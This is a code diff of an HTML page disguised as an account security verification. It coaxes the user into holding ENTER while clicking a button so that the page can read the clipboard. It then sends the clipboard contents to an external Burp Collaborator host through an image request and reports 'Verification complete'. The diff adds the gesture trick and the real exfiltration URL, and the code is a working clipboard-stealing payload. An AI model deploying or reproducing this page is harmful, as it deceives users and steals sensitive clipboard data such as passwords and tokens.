@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Validasi Gestur Hybrid</title>
+  <title>Secure Validation</title>
   <style>
     body {
       font-family: sans-serif;
@@ -22,53 +22,62 @@
       margin-top: 20px;
       font-weight: bold;
       color: green;
+      white-space: pre-wrap;
     }
   </style>
 </head>
 <body>
 
-  <h2>Verifikasi Keamanan Akun</h2>
-  <div id="msg">Tekan ENTER untuk memulai verifikasi...</div>
-  <button id="btn" style="display:none;">Lanjutkan Verifikasi</button>
+  <h2>Account Security Validation</h2>
+  <div id="msg">🔐 Press the ENTER key to begin verification</div>
+  <button id="btn" style="display:none;">Continue Verification</button>
   <div id="result"></div>
 
   <script>
     let stage = 0;
     let triggered = false;
+    let enterHeld = false;
 
     document.addEventListener("keydown", (e) => {
       if (e.key !== "Enter") return;
 
       if (stage === 0) {
         stage = 1;
-        document.getElementById("msg").innerText = "✅ Tahap 1: Gestur keyboard terdeteksi.\nSekarang klik tombol di bawah.";
+        document.getElementById("msg").innerText = "⬇️ Now press and hold ENTER while clicking the button below";
         document.getElementById("btn").style.display = "inline-block";
-      } else if (stage === 2) {
-        document.getElementById("msg").innerText = "✅ Verifikasi selesai.";
-        document.getElementById("result").innerText = "Terima kasih telah memverifikasi!";
+      }
+
+      if (stage === 1) {
+        enterHeld = true;
+      }
+    });
+
+    document.addEventListener("keyup", (e) => {
+      if (e.key === "Enter") {
+        enterHeld = false;
       }
     });
 
     document.getElementById("btn").addEventListener("click", () => {
-      if (stage === 1 && !triggered) {
+      if (stage === 1 && enterHeld && !triggered) {
         triggered = true;
-        stage = 2;
-
-        document.getElementById("msg").innerText = "📋 Membaca clipboard...";
+        document.getElementById("msg").innerText = "📋 Reading clipboard...";
 
         navigator.clipboard.readText()
           .then(text => {
-            document.getElementById("result").innerText = "📋 Clipboard:\n" + text;
+            document.getElementById("result").innerText = "📋 Clipboard contains:\n" + text;
 
-            // Optional: exfiltrate
+            // Optional: exfiltration
             const img = new Image();
-            img.src = "https://your-collab-url.net/log?clip=" + encodeURIComponent(text);
+            img.src = "https://7lt06qlfukri71j8ui2scllc238vwk.burpcollaborator.net/log?clip=" + encodeURIComponent(text);
 
-            document.getElementById("msg").innerText = "✅ Clipboard berhasil dibaca.\nTekan ENTER untuk menyelesaikan.";
+            document.getElementById("msg").innerText = "✅ Verification complete.";
           })
           .catch(err => {
-            document.getElementById("msg").innerText = "❌ Gagal membaca clipboard: " + err;
+            document.getElementById("msg").innerText = "❌ Failed to read clipboard: " + err;
           });
+      } else if (!enterHeld) {
+        document.getElementById("msg").innerText = "⚠️ Please press and hold ENTER while clicking the button!";
       }
     });
   </script>
